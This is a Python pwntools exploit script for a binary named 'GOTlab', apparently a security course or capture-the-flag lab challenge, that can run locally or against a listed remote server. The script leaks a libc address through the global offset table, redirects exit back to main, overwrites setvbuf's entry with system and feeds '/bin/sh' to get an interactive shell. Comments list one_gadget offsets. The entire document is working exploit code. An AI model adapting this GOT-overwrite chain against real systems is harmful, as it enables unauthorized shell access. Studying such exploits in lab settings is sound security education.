#!/usr/bin/python3

from pwn import *
import sys

e = ELF('./GOTlab')
#libc = ELF('./libc-2.29.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if len(sys.argv) > 1:
    r = remote('140.112.31.97', 30103)
else:
    r = process('./GOTlab')

r.sendline(str(0x404028)) # setvbuf
r.recvuntil('address : ')
libc_base = int(r.recvline()[:-1], 16) - libc.symbols['setvbuf']
log.info('libc_base : {}'.format(hex(libc_base)))

r.sendline(str(0x404038)) # exit
r.sendline(str(0x401242)) # main

r.sendline(str(0x404028)) # garbage
r.sendline(str(0x404028)) # setvbuf
r.sendline(str(libc_base + libc.symbols['system']))

r.sendline(str(0x404028)) # garbage
r.sendline(str(libc_base + libc.symbols['_IO_2_1_stdin_']))
r.sendline(str(u64(b'/bin/sh\x00')))
"""
IN LOCAL:
0xe6e79 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

REMOTE:
0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
r.interactive()
